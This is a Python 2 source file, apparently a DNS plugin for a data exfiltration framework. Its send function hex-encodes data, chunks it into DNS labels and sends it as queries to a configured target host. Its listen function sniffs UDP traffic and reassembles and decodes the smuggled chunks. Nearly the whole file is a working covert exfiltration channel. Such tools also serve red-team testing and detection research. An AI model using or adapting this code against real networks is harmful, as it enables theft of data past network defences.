from dnslib import *
try:
    from scapy.all import *
except:
    print "You should install Scapy if you run the server.."

app_exfiltrate = None
config = None
buf = {}
lastdata = ' '

def handle_dns_packet(x):
    global lastdata
    global buf
    try:
        qname = x.payload.payload.payload.qd.qname
        if (config['key'] in qname):
            app_exfiltrate.log_message(
                'info', '[dns] DNS Query: {0}'.format(qname))
            data = qname.split(".")[0]
            jobid = data[0:7]
            data = data.replace(jobid, '')
            # app_exfiltrate.log_message('info', '[dns] jobid = {0}'.format(jobid))
            # app_exfiltrate.log_message('info', '[dns] data = {0}'.format(data))
            if jobid not in buf:
                buf[jobid] = []
            # check for duplicate data
            if data != lastdata:
                lastdata = data
            else:
                # print "Skipped: " + data
                return
            if data not in buf[jobid]:
                buf[jobid].append(data)
            else:
                print "WARNING: DUPLICATED DATA"
            if (len(qname) < 68):
                print ''.join(buf[jobid]).decode('hex')
                app_exfiltrate.retrieve_data(''.join(buf[jobid]).decode('hex'))
                buf[jobid] = []
    except Exception, e:
        # print e
        pass

def insertDot(mystring, position):
    longi = len(mystring)
    mystring   =  mystring[:position] + '.' + mystring[position:] 
    return mystring  

def send(data,label_len = 63,query_len = 252):
    # Send function
    print data
    target = config['target']
    port = config['port']
    jobid = data.split("|!|")[0]
    data = data.encode('hex')
    while data != "":
        tmp = data[:query_len - len(config['key']) - len(jobid) - (query_len/label_len)]
        data = data.replace(tmp, '')
        for i in [x for x in xrange(len(tmp)) if x%label_len == 0]:
            tmp = insertDot(tmp, i)
        domain = "{0}{1}.{2}".format(jobid, tmp, config['key'])
        print len(domain)
        app_exfiltrate.log_message(
            'info', "[dns] Sending {0} to {1}".format(domain, target))
        q = DNSRecord.question(domain)
        try:
            q.send(target, port, timeout=0.01)
        except:
            # app_exfiltrate.log_message('warning', "[dns] Failed to send DNS request")
            pass


def listen():
    app_exfiltrate.log_message(
        'info', "[dns] Waiting for DNS packets for domain {0}".format(config['key']))
    sniff(filter="udp and port {}".format(
        config['port']), prn=handle_dns_packet)


class Plugin:

    def __init__(self, app, conf):
        global app_exfiltrate, config
        config = conf
        app.register_plugin('dns', {'send': send, 'listen': listen})
        app_exfiltrate = app
